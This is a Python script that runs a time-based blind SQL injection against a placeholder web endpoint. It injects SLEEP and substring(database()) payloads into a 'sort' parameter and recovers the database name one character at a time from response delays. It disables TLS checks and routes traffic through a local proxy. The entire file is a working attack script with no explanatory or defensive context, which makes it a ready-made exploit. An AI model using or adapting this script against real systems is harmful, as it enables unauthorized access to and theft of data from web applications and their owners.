import requests
import urllib3
urllib3.disable_warnings()

headers = {
    '': '',
    '': '',
    '': '',
    '': ''
    }


chars= ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 
         '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '-' ,'_' ,'@','.',' ',':']


def make_request():
    user=''
    number=1
    value_len=4
    while True :
        for char in chars:
            data = "sort=1%20and%20if(substring(database()%2c1%2c{})%3d'{}'%2cSLEEP(12)%2c1)--".format( number,user+char) 
            print(data)
            response = requests.post('https://domain.tld/end/point', headers=headers, data=data, verify=False , proxies={"http": "http://127.0.0.1:8081", "https": "http://127.0.0.1:8081"})
            try:
                if response.elapsed.total_seconds() > 12:
                    response = requests.post('https://domain.tld/end/point', headers=headers, data=data, verify=False)
                    if response.elapsed.total_seconds() > 12:
                        user += char
                        number += 1
                        print("Char is: {}".format(char))
                        print("Value is: {}...".format(user))
                        if value_len+1 == number:
                            print("rzlt: {}".format(user))
                            exit()
                        else:
                            break
                    else:
                         print("Not: {}".format(char))
                else:
                         print("Not: {}".format(char))
            except Exception as e:
                print("An error occurred:", e)
make_request()
